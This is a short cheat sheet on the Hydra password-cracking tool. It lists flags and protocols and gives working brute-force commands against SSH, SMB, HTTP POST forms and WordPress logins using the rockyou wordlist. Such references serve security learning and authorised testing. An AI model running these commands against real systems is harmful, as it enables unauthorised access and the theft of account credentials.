---
date: 2024-12-15
title: "Hydra"
tags: ["cheat sheet", "bruteforce"]
---

**Hydra** is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.

## Basic Syntax

```bash
hydra [options] <IP> <protocol>
```

## Common Flags

- **`-h`**: Display the help menu.
- **`-l <username>`**: Specify a single username/login.
- **`-L <wordlist>`**: Use a wordlist for usernames/logins.
- **`-p <password>`**: Specify a single password.
- **`-P <wordlist>`**: Use a wordlist for passwords.
- **`-s <PORT>`**: Specify the target port.
- **`-f`**: Stop brute-forcing after finding valid credentials.
- **`-R`**: Restore a previous session.
- **`-t <number>`**: Set the number of threads to use.
- **`-V`**: Enable verbose mode.

## Supported Protocols

Hydra supports numerous protocols, including:

- **SSH**
- **FTP**
- **POP3**
- **HTTP-FORM-GET**
- **HTTP-FORM-POST**
- **HTTP-HEAD**
- **HTTP-POST**
- **HTTP-GET**
- **IMAP**
- **SMB**
- **SMTP**
- **MySQL**

For the full list, refer to Hydra's help menu (`hydra -h`).

## Examples

### SSH Brute-Force Attack
```bash
hydra -l admin -P rockyou.txt 192.168.10.10 ssh
```

### SSH with Multiple Usernames
```bash
hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh
```

### SMB Brute-Force Attack
```bash
hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb
```

## Brute-Forcing HTTP POST Forms

Hydra can handle custom HTTP POST forms:

```bash
hydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \
"/login:username=admin&password=^PASS^:F=Your password is incorrect"
```

### Wordpress Login Brute-Force

Hydra can target WordPress login forms with custom parameters:

```bash
hydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \
"/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location"
```

## Tips and Tricks

- **Session Management**: Use `-R` to restore interrupted sessions without starting over.
- **Efficiency**: Adjust the number of threads with `-t` to balance speed and server load.
- **Verbose Mode**: Use `-V` to see each login attempt in real-time, useful for troubleshooting.
- **Custom Form Parameters**: Understand the target login form structure to craft precise Hydra commands.


--
